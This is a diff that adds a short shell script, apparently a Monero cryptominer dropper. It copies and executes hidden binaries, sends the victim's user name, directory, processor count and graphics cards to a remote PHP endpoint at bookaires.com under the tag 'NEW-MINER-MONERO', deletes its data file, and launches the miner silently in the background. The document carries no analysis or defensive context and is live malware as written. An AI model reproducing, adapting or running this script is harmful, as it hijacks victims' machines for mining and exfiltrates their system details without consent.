@@ -1,0 +1,19 @@
+#!/bin/sh
+pwd > dir.dir
+dir=$(cat dir.dir)
+touch .xmr.pid
+cp -f .crondsh crondsh
+cp -f .h64 h64
+cp -f .run run
+chmod +x *
+SERVERIP=`curl http://bookaires.com/feed/remote/rinfo.php`
+echo "$(whoami)@$SERVERIP
+DATE--->$(date)
+SCANDIR: $(pwd)
+PROCESORS: $(nproc)
+VIDEO CARDS: $(lspci | grep -i --color 'vga\|3d\|2d')" > data.file
+data=`cat data.file`
+curl -d "info=NEW-MINER-MONERO&data=$data" http://bookaires.com/feed/remote/rinfo.php
+rm -rf data.file
+./crondsh >/dev/null 2>&1
+./run &>/dev/null
